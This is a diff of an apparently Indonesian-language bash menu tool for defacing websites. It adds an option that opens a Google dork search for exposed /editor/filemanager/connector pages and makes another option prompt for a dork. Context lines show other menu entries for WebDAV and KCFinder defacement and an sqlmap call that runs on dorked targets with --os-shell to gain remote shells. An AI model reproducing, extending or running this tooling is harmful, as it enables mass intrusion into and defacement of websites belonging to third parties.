@@ -24,6 +24,7 @@ echo $blue "(4).> Script Deface"
 echo $blue "(5).> Deface Website Dengan Webdav"
 echo $blue "(6).> Deface Website Dengan Kcfinder (using shell)"
 echo $blue "(7).> Auto pasang shell dengan sqlmap"
+echo $blue "(8).> Deface Website Dengan Exploit /editor/filemanager/connector"
 echo $yello "(0).> Keluar"
 echo $white "[#]==================================================[#]"
 read -p "root@DefaceTool-#" bego
@@ -71,8 +72,8 @@ read -p "Pilih : " asw
 
 if [ $asw = 1 ]
 then
-echo "Buka Browser !"
-xdg-open "www.google.com"
+read -p "Masukan Dork : " d
+xdg-open www.google.com
 fi
 
 if [ $asw = 2 ]
@@ -292,6 +293,12 @@ cd sqlmap
 python2 sqlmap.py -g $d --dbs --batch --level=2 --risk=2 --os-shell --output=hasil
 sleep 1
 echo "Done !"
+fi
+
+if [ $bego = 8 ] || [ $bego = 8 ]
+then
+clear
+xdg-open https://www.google.com/search?q=inurl%3A%2Feditor%2Ffilemanager%2Fconnectors&oq=inurl%3A%2Fed&aqs=chrome.0.69i59j69i57j69i58.48480j0j7&sourceid=chrome&ie=UTF-8
 fi
 
 if [ $bego = 0 ] || [ $bego = 0 ]
